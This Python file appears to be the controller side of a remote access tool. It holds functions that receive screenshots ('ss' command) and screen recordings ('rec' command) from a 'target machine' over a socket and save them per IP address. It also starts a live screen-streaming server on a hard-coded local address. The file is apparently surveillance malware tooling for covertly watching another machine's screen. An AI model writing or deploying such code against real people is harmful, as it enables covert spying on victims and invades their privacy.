import os
from vidstream import StreamingServer
from utils.showUtils import show_video,show_image

# to get screenshot of target machine - ss command
def screenshot(conn,ip):
    print("conn ip ",conn, ip)
    print("clicking")
    l=int(conn.recv(20480).decode())
    conn.send("start".encode())
    curr_len=0
    f=open(os.path.join(ip,"ss.jpg"),"wb")

    while curr_len<l:
        print("",end="\r")
        data=conn.recv(2048000)
        f.write(data)
        curr_len+=len(data)
        print("Progress: {a:.2f} %".format(a=(curr_len/l)*100),end="")

    f.close()
    print("\ndone")
    conn.send("done".encode())
    show_image(ip)
    output=conn.recv(20480).decode()
    print(output,end="") 

# to get screen recording of target machine - rec command
def screenCapture(conn,ip):
    print("capturing..")
    l=int(conn.recv(20480).decode())
    #l=(conn.recv(20480).decode())
    print("l is ",l)
    conn.send("start".encode())
    f=open(os.path.join(ip,"screen.avi"),"wb")
    curr_len=0
    while curr_len<l:
        print("",end="\r")
        data=conn.recv(204800000)
        curr_len+=len(data)
        print("Progress: {a:.2f} %".format(a=(curr_len/l)*100),end="")
        f.write(data)


    f.close()
    print("\ndone..")
    conn.send("done".encode())
    show_video(os.path.join(ip,'screen.avi'),ip)
    output=conn.recv(10240).decode()
    print(output,end="")


def screenstream():
    server = StreamingServer('192.168.1.5', 7878)
    server.start_server()
